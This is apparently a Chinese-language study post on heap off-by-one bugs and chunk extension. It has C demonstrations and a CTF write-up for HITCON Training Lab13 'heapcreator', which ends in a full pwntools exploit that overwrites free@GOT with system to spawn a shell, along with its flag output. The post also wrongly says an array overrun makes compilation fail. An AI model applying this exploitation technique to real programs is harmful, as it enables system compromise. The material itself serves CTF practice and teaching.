---
title: off-by-one和chunk extend
tags:
  - binary
---

## off-by-one

### 导入

一个情景：

```c

/*
{
    int a[10];
    for (int i = 0;i <= 10;i++)
        scanf("%d",a[i]);
}
*/
/*
{
	char buf[20];
	LEN = 20;
	read(0,buf,LEN+1);
}
*/
```

这是一个明显的错误，数组下标越界。然而就是这么一个简单的边界处理问题，导致整个程序编译失败了。但是如果这一个错误并没有使程序崩溃，而是修改了一个非法地址，从而对非预期地址进行操作，那就构成了一个漏洞。

给出off-by-one 的定义：**指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。**

基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂,堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。

### 思路

1.  溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
2. 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 `prev_in_use` 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 `prev_size` 域就会启用，就可以伪造 `prev_size` ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 `prev_size` 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。

## Chunk Extend

### 导入

chunk开头有标志size的信息，通过覆盖size位可以扩大Chunk。

比如

```
0x0000000000000000  0x0000000000000021
```

这么一个chunk头，你通过溢出，off-by-one等覆盖掉这个21，修改为

```
0x0000000000000000  0x0000000000000041
```

这样，你就~~凑成了一个三连~~获得了一个0x30大小的chunk。从而能够进一步控制chunk的内容、指针等。

### 示例1

```c
int main(void)
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);
    malloc(0x10);

    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    return 0;
}
```

### 示例2——通过 extend 后向 overlapping

```c
int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第1个 0x10 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```

如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。

通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。

## 例题

### HITCON Training Lab13 heapcreator

```
$ checksec heapcreator
[*] '/home/abc/work/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

保护机制，开启Canary和NX，没有开PIE。

```c
heaparray[i] = malloc(0x10uLL);
printf("Size of Heap : ");
read(0, &buf, 8uLL);
v0 = heaparray[i];
v0[1] = malloc(size);
*(_QWORD *)heaparray[i] = size;
printf("Content of heap:", &buf);
read_input(*((void **)heaparray[i] + 1), size);
```

大致猜测结构体：

```c
struct Creator{
    size_t size;
    char *content;
}
```

read_input函数中无异常：

```c
result = read(0, a1, a2);
```

edit函数调用read_input时出现问题：

```c
read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);// off-by-one
```

由于多读取一个字符，出现off-by-one。

free：

```c
free(*((void **)heaparray[v1] + 1));
free(heaparray[v1]);
heaparray[v1] = 0LL;
```

此时已经可以开始整理思路了。

1. free后清零，UAF不可用，存在off-by-one。
2. content段单独malloc，将指针存入本体chunk中，可以利用chunk overlapping覆盖指针进行操作。

/bin/sh可以写入，考虑泄露libc地址之后利用system。

1. 先malloc(0x18),malloc(0x10)将/bin/sh填入0x18的chunk备用，0x18字节用于覆盖下一个chunk的size。
2. 将下一个chunk的size改大。free掉这个被改的chunk，使得它的content跟本体上下颠倒。
3. 利用edit将本体中的content指针修改为free.got的地址，利用show将free.got打印出来计算偏移。
4. 由于content指针指向free.got，所以edit时会把free.got改成system，此时free掉chunk0即执行system("/bin/sh")

payload:

```python
#!/usr/bin/env python
from pwn import *
io = remote('node3.buuoj.cn',26778)
elf = ELF('./heapcreator')
libc = ELF('./x64-libc-2.23.so')
context.log_level = 'debug'

ru = lambda x : io.recvuntil(x)
sl = lambda x : io.sendline(x)
sd = lambda x : io.send(x)
it = lambda : io.interactive()


def add(size,content):
    ru('ice :')
    sl('1')
    ru('Heap :')
    sl(str(size))
    ru('heap:')
    sl(content)

def edit(index,content):
    ru('ice :')
    sl('2')
    ru('dex :')
    sl(str(index))
    ru('heap : ')
    sl(content)

def show(idx):
    ru('ice :')
    sl('3')
    ru('dex :')
    sl(str(idx))

def free(idx):
    ru('ice :')
    sl('4')
    ru('dex :')
    sl(str(idx))

add(0x18,'a')#0
add(0x10,'a')#1
edit(0,'/bin/sh\x00'+p64(0)*2+p8(0x41))
free(1)
add(0x30,p64(0)*4+p64(0x30)+p64(elf.got['free']))
show(1)
ru('Content : ')
leak = u64(io.recv(6).ljust(8,'\x00'))
offset = leak - libc.sym['free']
system = offset + libc.sym['system']
edit(1,p64(system))
free(0)
it()
```

```
[DEBUG] Received 0x2b bytes:
    'flag{149272b6-508e-47d6-aeba-3a1f6d7d7dc7}\n'
flag{149272b6-508e-47d6-aeba-3a1f6d7d7dc7}
```

